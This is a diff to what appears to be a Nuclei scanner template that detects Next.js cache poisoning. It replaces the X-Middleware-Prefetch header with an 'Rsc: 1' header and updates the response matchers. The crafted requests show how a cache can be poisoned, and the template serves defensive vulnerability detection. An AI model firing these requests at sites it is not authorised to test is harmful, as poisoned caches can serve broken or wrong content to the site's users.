@@ -1,11 +1,11 @@
-id: nextjs-middleware-cache
+id: nextjs-rsc-cache
 
 info:
   name: Next.js - Cache Poisoning
   author: DhiyaneshDk
   severity: high
   description: |
-     Next.js is vulnerable to Cache Poisoning using X-Middleware-Prefetch.
+     Next.js is vulnerable to Cache Poisoning using RSC.
   reference:
     - https://zhero-web-sec.github.io/research-and-things/nextjs-and-cache-poisoning-a-quest-for-the-black-hole
   metadata:
@@ -27,15 +27,15 @@ http:
       - |
         GET /?cb={{rand}} HTTP/1.1
         Host: {{Hostname}}
-        X-Middleware-Prefetch: 1
         Priority: u=1
+        Rsc: 1
 
       - |
         @timeout: 10s
         GET /?cb={{rand}} HTTP/1.1
         Host: {{Hostname}}
-        X-Middleware-Prefetch: 1
         Priority: u=1
+        Rsc: 1
 
       - |
         @timeout: 10s
@@ -45,7 +45,7 @@ http:
     matchers:
       - type: dsl
         dsl:
-          - "status_code_2 == 200 && contains(all_headers_2, 'X-Middleware-Skip: 1') && !contains(cache_control_2, 'no-cache') && !contains(pragma_2, 'no-cache')"
-          - "status_code_3 == 200 && contains(all_headers_3, 'X-Middleware-Skip: 1') && !contains(cache_control_3, 'no-cache') && !contains(pragma_3, 'no-cache')"
+          - "status_code_2 == 200 && contains(content_type_2, 'text/x-component') && !contains(cache_control_2, 'no-cache') && !contains(pragma_2, 'no-cache')"
+          - "status_code_3 == 200 && contains(content_type_3, 'text/x-component') && !contains(cache_control_3, 'no-cache') && !contains(pragma_3, 'no-cache')"
         condition: and
-# digest: 490a0046304402201de2e605fd1dedf99328fc7a3049802725c96853d835abd9f1efced0f9ef602f022067fb135fa0fd70c30feaa06acd7354d69537cb778c66dd4e7acf828d7467b0d7:922c64590222798bb761d5b6d8e72950
+# digest: 4b0a00483046022100ceb7f9247a0d0473b9979d3e4acaa67e60e87c1b91da2488a05edee065fde1040221009d13a9401fd500b10d0c51aefb5b9451d93839f031cc6e0f91deb5745ffe52fa:922c64590222798bb761d5b6d8e72950
